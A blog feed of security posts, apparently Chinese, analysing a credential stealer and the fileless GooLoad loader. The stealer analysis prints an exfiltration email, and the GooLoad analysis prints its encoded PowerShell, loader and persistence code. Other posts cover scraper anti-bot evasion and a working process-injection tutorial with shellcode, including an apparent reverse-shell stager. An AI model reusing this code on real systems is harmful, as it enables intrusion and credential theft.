Thread.CurrentThread.CurrentUICulture = new CultureInfo(&quot;en-US&quot;); //设置区域为en-us        }    }    // Token: 0x0600000D RID: 13 RVA: 0x00002584 File Offset: 0x00000784    private static void DumpExceptions(string msg, Exception e, bool ename)    {        Console.WriteLine(&quot;\n&quot; + msg);        int num = 1;        while (e != null)        {            if (ename || e.Message == null || e.Message.Length == 0)            {                Console.WriteLine(string.Concat(new object[]                {                    num,                    &quot;: &quot;,                    e.GetType().FullName,                    &quot; - &quot;,                    e.Message                }));            }            else            {                Console.WriteLine(num + &quot;: &quot; + e.Message);            }            if (e is RegistrationException)            {                RegistrationErrorInfo[] errorInfo = ((RegistrationException)e).ErrorInfo;                if (errorInfo != null)                {                    foreach (RegistrationErrorInfo registrationErrorInfo in errorInfo)                    {                        if (registrationErrorInfo.MinorRef.ToLower(CultureInfo.InvariantCulture) != &quot;&lt;invalid&gt;&quot;)                        {                            Console.WriteLine(string.Concat(new string[]                            {                                &quot;    &quot;,                                registrationErrorInfo.Name,                                &quot;.&quot;,                                registrationErrorInfo.MinorRef,                                &quot;: &quot;,                                registrationErrorInfo.ErrorString                            }));                        }                        else                        {                            Console.WriteLine(&quot;    &quot; + registrationErrorInfo.Name + &quot;: &quot; + registrationErrorInfo.ErrorString);                        }                    }                }            }            num++;            e = e.InnerException;        }    }    // Token: 0x0600000E RID: 14 RVA: 0x000026EE File Offset: 0x000008EE    private static void PrintLogo()    {        Console.WriteLine(Resource.FormatString(&quot;RegSvcs_CopyrightMsg&quot;, &quot;4.7.3062.0&quot;, CommonResStrings.CopyrightForCmdLine));    }    // Token: 0x0600000F RID: 15 RVA: 0x0000270C File Offset: 0x0000090C    private static bool IsArgument(string arg, string check)    {        string b = arg.ToLower(CultureInfo.InvariantCulture);        return &quot;/&quot; + check == b || &quot;-&quot; + check == b;    }    // Token: 0x06000010 RID: 16 RVA: 0x0000274C File Offset: 0x0000094C    private static bool IsPrefixArgument(string arg, string check, ref string prefix)    {        string text = arg.ToLower(CultureInfo.InvariantCulture);        prefix = null;        if (arg.StartsWith(&quot;/&quot; + check + &quot;:&quot;, StringComparison.Ordinal) || arg.StartsWith(&quot;-&quot; + check + &quot;:&quot;, StringComparison.Ordinal))        {            if (arg.Length &gt; check.Length + 2)            {                prefix = arg.Substring(check.Length + 2);            }            return true;        }        return RegSvcs.IsArgument(arg, check);    }    // Token: 0x06000011 RID: 17 RVA: 0x000027C4 File Offset: 0x000009C4    private static void ParseArguments(string[] args) //根据命令行参数做出对应的函数处理    {        RegSvcs.regConfig.InstallationFlags = (InstallationFlags.FindOrCreateTargetApplication | InstallationFlags.ReconfigureExistingApplication | InstallationFlags.ReportWarningsToConsole);        RegSvcs.logoOutput = true;        RegSvcs.successOutput = true;        RegSvcs.uninstallApplication = false;        if (args.Length &lt; 1)        {            throw new UsageException(0);        }        int i;        for (i = 0; i &lt; args.Length; i++)        {            string text = null;            if (RegSvcs.IsArgument(args[i], &quot;?&quot;) || RegSvcs.IsArgument(args[i], &quot;help&quot;))            {                throw new UsageException(0);            }            if (RegSvcs.IsArgument(args[i], &quot;c&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.CreateTargetApplication;                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.FindOrCreateTargetApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;fc&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.FindOrCreateTargetApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;exapp&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~(InstallationFlags.CreateTargetApplication | InstallationFlags.FindOrCreateTargetApplication);            }            else if (RegSvcs.IsArgument(args[i], &quot;extlb&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ExpectExistingTypeLib;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;tlb&quot;, ref text))            {                RegSvcs.regConfig.TypeLibrary = text;            }            else if (RegSvcs.IsArgument(args[i], &quot;reconfig&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ReconfigureExistingApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;noreconfig&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.ReconfigureExistingApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;nologo&quot;))            {                RegSvcs.logoOutput = false;            }            else if (RegSvcs.IsArgument(args[i], &quot;quiet&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.ReportWarningsToConsole;                RegSvcs.logoOutput = false;                RegSvcs.successOutput = false;            }            else if (RegSvcs.IsArgument(args[i], &quot;u&quot;))            {                RegSvcs.uninstallApplication = true;            }            else if (RegSvcs.IsArgument(args[i], &quot;componly&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ConfigureComponentsOnly;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;appname&quot;, ref text))            {                RegSvcs.regConfig.Application = text;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;parname&quot;, ref text))            {                RegSvcs.regConfig.Partition = text;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;appdir&quot;, ref text))            {                RegSvcs.regConfig.ApplicationRootDirectory = text;            }            else            {                if (args[i].StartsWith(&quot;/&quot;, StringComparison.Ordinal) || args[i].StartsWith(&quot;-&quot;, StringComparison.Ordinal))                {                    throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_InvalidOption&quot;, args[i]));                }                break;            }        }        if (i &gt; args.Length)        {            throw new UsageException(1);        }        int num = args.Length - i;        if (num == 0)        {            throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_NotEnoughArgs&quot;));        }        if (num == 1)        {            RegSvcs.regConfig.AssemblyFile = args[i];            return;        }        if (num == 2)        {            RegSvcs.regConfig.AssemblyFile = args[i];            RegSvcs.regConfig.Application = args[i + 1];            RegSvcs.regConfig.TypeLibrary = null;            return;        }        if (num == 3)        {            RegSvcs.regConfig.AssemblyFile = args[i];            RegSvcs.regConfig.Application = args[i + 1];            RegSvcs.regConfig.TypeLibrary = args[i + 2];            return;        }        throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_ToManyArgs&quot;));    }    // Token: 0x04000002 RID: 2    private const int MAX_PATH = 260;    // Token: 0x04000003 RID: 3    private static RegistrationConfig regConfig = new RegistrationConfig();    // Token: 0x04000004 RID: 4    private static bool logoOutput;    // Token: 0x04000005 RID: 5    private static bool successOutput;    // Token: 0x04000006 RID: 6    private static bool uninstallApplication;}</code></pre><p>看了一下连接信息：<br>先发送了一个Auth的请求头进行验证</p><pre><code>解码:info@stankovic.hr</code></pre><p><img src="https://z3.ax1x.com/2021/04/14/cybeRP.png" alt=""></p><p>验证成功后会收集本机信息进行上传(发送到邮箱)<br><img src="https://z3.ax1x.com/2021/04/14/cybUMT.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/14/cybBdJ.png" alt=""></p><pre><code>MIME-Version: 1.0From: info@stankovic.hrTo: info@stankovic.hrDate: 28 Jul 2020 20:46:04 +0100Subject: PW_admin/USER-PCContent-Type: text/html; charset=us-asciiContent-Transfer-Encoding: quoted-printableTime: 07/28/2020 20:45:57User Name: adminComputer Name: U=SER-PCOSFullName: Microsoft Windows 7 ProfessionalCPU: I=ntel(R) Core(TM) i5-6400 CPU @ 2.70GHzRAM: 3583.61 MB&lt;hr&gt;=URL:192.168.1.10D=0AUsername:honey@pot.com0D=0APassword=:honeypass3560D=0AApplication:Outlook0D=0A&lt;hr&gt;=0D=0AURL=:https://m.facebook.com/0D=0AUsername:honey@pot.com0D=0A=Password:honeypass3560D=0AApplication:Chrome0D=0A&lt;hr&gt;=0D=0A=URL:https://m.facebook.com0D=0AUsername:honey@pot.com0D=0A=Password:honeypass3560D=0AApplication:Firefox0D=0A&lt;hr&gt;=0D=0A</code></pre><p>还有一些功能需要详细分析，感觉需要HOOK才能更好的分析….</p><p>MD5:1A25E75693B99AD09E55AEA29C6F2775<br>IOC:<br>89.201.175.36</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>无文件GooLoad静态分析</title>
      <link href="/posts/9d2ce0c6.html"/>
      <url>/posts/9d2ce0c6.html</url>
      <content type="html"><![CDATA[<p>Youtube分析视频:<a href="https://www.youtube.com/watch?v=BcFbkjUVc7o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=BcFbkjUVc7o</a><br>样本下载地址:<a href="https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3" target="_blank" rel="noopener">https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>md5:1766EFD0E682B405C2A49613DD1B4D81<br>sha1:6A8644B0A41B471D21476FDE2D2C07599943BF55<br>sha256:8D39AA47F437C37451A7D249E5EEE77D1BE6C00C95FAD82D69C119A734F5F4B3</p><p>拿到的是个js，启动用wscript启动。js内容如下<br><img src="https://z3.ax1x.com/2021/04/12/cDuuJx.png" alt=""></p><p>丢到<code>https://lelinhtinh.github.io/de4js/</code>美化一下代码<br><img src="https://z3.ax1x.com/2021/04/12/cDuqt1.png" alt=""></p><p>执行流程如下:<br>1.首先是获取当前用户名称，创建了一个注册表路径:<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;</code><br>2.读取ocwbowtyl变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>3.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>4.创建注册表路径<code>HKEY_CURRENT_USER\SOFTWARE\&lt;%USERNAME%1&gt;</code><br>5.gzmttsouj赋值znahht<br>6.读取gzmttsouj变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>7.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>8.判断文件夹(<code>C:\Program Files (x86)</code>)是否存在，决定采用那个powershell执行<br>9.执行powershell command</p><p><img src="https://z3.ax1x.com/2021/04/12/cDKHKS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/12/cDKxCq.png" alt=""></p><p>执行的powershell command<br><img src="https://z3.ax1x.com/2021/04/12/cDMTiR.png" alt=""></p><p>解码如下<br><img src="https://z3.ax1x.com/2021/04/12/cDQRfI.png" alt=""></p><pre><code class="powershell">#cmd /c C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -En &quot;PAAjACAAdQB2AHgAdgByAGwAIAAjAD4AJAB1AD0AJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAA3ADAAMAA7ACQAaQArACsAKQB7ACQAYwA9ACIASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAIgArACQAdQArACIAMQAiADsAVAByAHkAewAkAGEAPQAkAGEAKwAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAHAAYQB0AGgAIAAkAGMAKQAuACQAaQB9AEMAYQB0AGMAaAB7AH0AfQA7AGYAdQBuAGMAdABpAG8AbgAgAGMAaABiAGEAewBbAGMAbQBkAGwAZQB0AGIAaQBuAGQAaQBuAGcAKAApAF0AcABhAHIAYQBtACgAWwBwAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACkAXQBbAFMAdAByAGkAbgBnAF0AJABoAHMAKQA7ACQAQgB5AHQAZQBzACAAPQAgAFsAYgB5AHQAZQBbAF0AXQA6ADoAbgBlAHcAKAAkAGgAcwAuAEwAZQBuAGcAdABoACAALwAgADIAKQA7AGYAbwByACgAJABpAD0AMAA7ACAAJABpACAALQBsAHQAIAAkAGgAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwA9ADIAKQB7ACQAQgB5AHQAZQBzAFsAJABpAC8AMgBdACAAPQAgAFsAYwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgB5AHQAZQAoACQAaABzAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAkAGkALAAgADIAKQAsACAAMQA2ACkAfQAkAEIAeQB0AGUAcwB9ADsAJABpACAAPQAgADAAOwBXAGgAaQBsAGUAIAAoACQAVAByAHUAZQApAHsAJABpACsAKwA7ACQAawBvACAAPQAgAFsAbQBhAHQAaABdADoAOgBTAHEAcgB0ACgAJABpACkAOwBpAGYAIAAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewAgAGIAcgBlAGEAawB9AH0AWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIABjAGgAYgBhACgAJABhAC4AcgBlAHAAbABhAGMAZQAoACIAIwAiACwAJABrAG8AKQApADsAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AFsATQBvAGQAZQBdADoAOgBTAGUAdAB1AHAAKAApADsA &quot; &lt; # uvxvrl # &gt;$u = $env:UserName;for ($i = 0;$i  - le 700;$i++) {    $c = &quot;HKCU:\SOFTWARE\&quot;+$u+&quot;1&quot;;    Try{        $a=$a+(Get-ItemProperty -path $c).$i #获取KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值    }Catch{    }};function chba{    #转换为二进制数据    [cmdletbinding()]param([parameter(Mandatory=$true)][String]$hs);    $Bytes = [byte[]]::new($hs.Length / 2);    for($i=0; $i -lt $hs.Length; $i+=2){        $Bytes[$i/2] = [convert]::ToByte($hs.Substring($i, 2), 16)    }    $Bytes};$i = 0;While ($True){    $i++;    $ko = [math]::Sqrt($i);    if ($ko -eq 1000){         break    }}[byte[]]$b = chba($a.replace(&quot;#&quot;, $ko)); #将&quot;#&quot;替换为1000 1000对应十六进制为NULL[Reflection.Assembly]::Load($b); #远程加载[Mode]::Setup();</code></pre><p>powershell执行流程:<br>1.获取<code>KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值</code><br>2.获取到内容将#替换为1000<br>3.远程加载执行<br>4.调用远程加载里的<code>setup</code>函数</p><p>提取znahht变量的内容，将#替换为1000.十六进制解码，丢进dnSpy分析</p><p>md5:404280229BFDBE01D751BCE03210F75E<br>sha1:098B332B7A4F8712916D6A681799E390DAAAEF98<br>sha256:BFFA7EC58ABF9F4AB9940C1633EF86484DFC1425326EC247699BBB2D1C6E45A9</p><p>得到的结果如下</p><pre><code class="csharp">// Mode// Token: 0x06000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304public static string Setup(){    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\&quot; + Environment.UserName); //读取HKCU\SOFTWARE\&lt;USERNAME&gt;    if (registryKey != null)    {        string text = &quot;&quot;;        for (int i = 0; i &lt; 99999; i++)        {            string text2 = &quot;&quot;;            try            {                text2 = registryKey.GetValue(i.ToString()).ToString(); //读取从0到99999键名的键值            }            catch            {            }            if (text2.Length == 0)            {                break;            }            text += text2;        }        registryKey.Close(); //关闭注册表        text = text.Replace(&quot;q&quot;, &quot;000&quot;).Replace(&quot;v&quot;, &quot;0&quot;).Replace(&quot;w&quot;, &quot;1&quot;).Replace(&quot;r&quot;, &quot;2&quot;).Replace(&quot;t&quot;, &quot;3&quot;).Replace(&quot;y&quot;, &quot;4&quot;).Replace(&quot;u&quot;, &quot;5&quot;).Replace(&quot;i&quot;, &quot;6&quot;).Replace(&quot;o&quot;, &quot;7&quot;).Replace(&quot;p&quot;, &quot;8&quot;).Replace(&quot;s&quot;, &quot;9&quot;).Replace(&quot;q&quot;, &quot;A&quot;).Replace(&quot;h&quot;, &quot;B&quot;).Replace(&quot;j&quot;, &quot;C&quot;).Replace(&quot;k&quot;, &quot;D&quot;).Replace(&quot;l&quot;, &quot;E&quot;).Replace(&quot;z&quot;, &quot;F&quot;); //将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F        byte[] rawAssembly = Mode.STBA(text); //hex转换得到原始数据        Assembly assembly = Assembly.Load(rawAssembly); //远程加载        Type type = assembly.GetType(&quot;Diagnostics&quot;); //调用Diagnostics        object obj = Activator.CreateInstance(type);        MethodInfo method = type.GetMethod(&quot;Time&quot;);        method.Invoke(obj, null);        using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;, true)) //打开HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce注册表        {            string str = Environment.UserName.Replace(&quot; &quot;, &quot;&quot;); //将本机用户名的空格替换为空            registryKey2.SetValue(Environment.UserName, &quot;powershell -Win Hi -Command \&quot;$r = [Environment]::GetEnvironmentVariable(&#39;&quot; + str + &quot;&#39;, &#39;User&#39;).split();$p=$r[0];$r[0]=&#39;&#39;;Start-Process $p -ArgumentList ($r -join &#39; &#39;) -Win Hi\&quot;&quot;); //当前用户作为键名        }        using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(&quot;Environment&quot;, true)) //打开HKCU\Environment        {            string text3 = Environment.CommandLine; //获取此过程的命令行(由于是在powershell远程加载的所以这里获取到的是powershell.exe的路径)            if (!text3.Contains(&quot;windowstyle&quot;))            {                text3 = text3.Replace(&quot;.exe &quot;, &quot;.exe -windowstyle hidden &quot;); //执行的命令行存在windowstyle将.exe替换为.exe -windowstyle hidden[空格]            }            registryKey3.SetValue(Environment.UserName.Replace(&quot; &quot;, &quot;&quot;), text3);        }    }    return &quot;Install&quot;;}// Mode// Token: 0x06000001 RID: 1 RVA: 0x00002098 File Offset: 0x00000298public static byte[] STBA(string hex){    return (from x in Enumerable.Range(0, hex.Length)    where x % 2 == 0    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray&lt;byte&gt;(); //hex转换}</code></pre><p>md5:FD5B538D2523FEA19D7C11C4159A7EB6<br>sha1:5620A43E87ADB4517AA7181825612CFD7491AF3A<br>sha256:BBE6F87ECBA0F6452C6A7F3A81B6DBEB23787C754439BC979CAF653DC594B606</p><p>1.读取读取HKCU\SOFTWARE\<username>从0到99999键名的键值<br>2.将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F<br>3.hex转换得到原始数据<br>4.远程加载<br>5.调用Diagnostics.Time()<br>6.将此ps1的路径添加到启动路径HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</username></p><p>ocwbowtyl变量值hex解码还原dnSpy分析<br><img src="https://z3.ax1x.com/2021/04/12/cDNy0x.png" alt=""></p><p>分析结果为cs实现的傀儡进程（注入:C:\Program Files (x86)\Windows Photo Viewer\ImagingDevices.exe）<br><img src="https://z3.ax1x.com/2021/04/12/cDN4cd.png" alt=""></p><p>如果失败的话则会杀掉进程<br><img src="https://z3.ax1x.com/2021/04/12/cDNqN8.png" alt=""></p><p>提取注入的PE<br><img src="https://z3.ax1x.com/2021/04/12/cDNX9g.png" alt=""></p><p>ps:提取出来后<code>\s</code>替换为空。然后hex解码，得到PE<br><img src="https://z3.ax1x.com/2021/04/12/cDUPEV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/12/cDUtKA.png" alt=""></p><p>丢沙箱了没见到上线，IDA看了一下也没出什么有用的。具体不知<br><img src="https://z3.ax1x.com/2021/04/12/cD0O6e.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬取微信公众号小结</title>
      <link href="/posts/3dedb035.html"/>
      <url>/posts/3dedb035.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直想爬微信公众号然后整成一个bot。试过好几次<br>最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了</p><h2 id="爬取的方法"><a href="#爬取的方法" class="headerlink" title="爬取的方法"></a>爬取的方法</h2><p>网上能搜到的爬取方法：</p><ul><li>微信公众号平台接口抓取|限制:微信KEY有限制，30-40分钟内就会过期。请求次数超过10-20次被封</li><li>搜狗公众号爬取 | 缺陷：只能获取公众号最新更新的一条文章</li></ul><h2 id="爬取实现"><a href="#爬取实现" class="headerlink" title="爬取实现"></a>爬取实现</h2><p>这里是用第二种方法，方法如下<br>搜狗微信公众号搜索对应公众号:<code>https://weixin.sogou.com/weixin?type=1&amp;query=bibacps&amp;ie=utf8</code><br>获取文章链接<br><img src="https://z3.ax1x.com/2021/04/11/cwUusx.png" alt=""></p><p>然后请求这个链接得到wx文章的链接<br><img src="https://z3.ax1x.com/2021/04/11/cwU2yq.png" alt=""></p><p>经过测试，发现并无cookie等效验。访问<code>https://weixin.sogou.com/&lt;sougou_wx_lnk&gt;</code>就可以获取wx文章url。但是，请求次数太多就会出现验证码，只有cookie对了才不会有验证码<br>google后得到解决方法：</p><ul><li>随机UA头</li><li>每次请求之前先获取搜狗子域名cookie</li></ul><p>参考链接:<a href="https://blog.csdn.net/weixin_43881394/article/details/107768458" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43881394/article/details/107768458</a></p><p>获取子域名cookie</p><pre><code class="python">import requestsdef getcookie():    #从搜狗视频获取cookie，防止傻逼搜狗机制检测    url = &#39;https://v.sogou.com/v?ie=utf8&amp;query=&amp;p=40030600&#39;    headers = {&#39;User-Agent&#39;: UserAgent().random}    rst = requests.get(url=url,headers=headers,allow_redirects=False)    cookies = rst.cookies.get_dict()    return cookies</code></pre><p>爬取到wx文章链接后入库</p><p>最终效果如下<br><img src="https://z3.ax1x.com/2021/04/11/cw0RCF.png" alt=""></p><p>Github:<a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96</a></p><h2 id="爬虫小技巧"><a href="#爬虫小技巧" class="headerlink" title="爬虫小技巧"></a>爬虫小技巧</h2><pre><code>爬取大型站点（例如:google.com）可能会遇到的问题：    * 请求次数过多导致验证码    * Cookie判断是否多次请求解决发方法    * 随机IP代理    * 随机UA头    * SESSION请求    * 针对Cookie判断是否多次请求 （这种大型站点cookie生成机制都是一致的，可以请求这种站点的子域名获取cookie。每次请求之前，先从子域名获取cookie然后在用这个cookie请求要爬取的站点）    * 延时请求遇见CSRF TOKEN效验    * TOKEN效验    * COOKIE效验解决方法：    * 这种CRSF TOKEN一般在当前页面存在TOKEN，先获取TOKEN在去请求指定某个地区的IP请求解决方法：    * 使用对应地区的IP请求</code></pre>]]></content>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>傀儡进程</title>
      <link href="/posts/96bf6a75.html"/>
      <url>/posts/96bf6a75.html</url>
      <content type="html"><![CDATA[<p><strong>shellcode插入</strong><br>x64<br>整体流程：<br>1.创建进程，获取进程句柄 CreateProcessA<br>2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx<br>3.远程写入shellcode WriteProcessMemory<br>4.远程线程调用 CreateRemoteThread<br>5.等待返回 WaitForSingleObject<br>6.减少线程的挂起计数。当挂起计数减为零时，将继续执行线程。 ResumeThread</p><p>ps:其实这个不算最多算个线程劫持</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;int main(){        unsigned char buf[] =               &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;               &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;               &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;               &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;               &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;               &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;               &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;               &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;               &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;               &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;               &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;               &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;               &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;               &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;               &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;               &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;               &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;               &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;               &quot;\x63\x2e\x65\x78\x65\x00&quot;;        SIZE_T size = 0;        STARTUPINFOEXA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;        ZeroMemory(&amp;pi, sizeof(pi));        BOOL sucess = CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL,  NULL, true, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,  (LPSTARTUPINFOA)&amp;si, &amp;pi);        HANDLE notepadHandle = pi.hProcess;        LPVOID remotebuffer = VirtualAllocEx(notepadHandle, NULL, sizeof(buf),  (MEM_RESERVE | MEM_COMMIT),PAGE_EXECUTE_READWRITE);        WriteProcessMemory(notepadHandle,remotebuffer,buf,sizeof(buf),NULL);        HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0,  (LPTHREAD_START_ROUTINE)remotebuffer, NULL, 0, NULL); //remotebuffer为线程起始地址        if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {               return 1;        }        if (ResumeThread(pi.hThread) == -1) {               return 1;        }    return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3naLQ.png" alt=""></p><p>x86<br>寻找加载基地址，在加载基地址前运行shellcode：<br>1.挂起方式创建进程 CreateProcessA<br>2.获取线程里的PEB GetThreadContext<br>3.获取进程基地址保存在EAX ReadProcessMemory<br>4.在基地址之前写入shellcode WriteProcessMemory<br>5.恢复线程执行 ResumeThread</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;unsigned char buf[] =&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x5d\x8d&quot;&q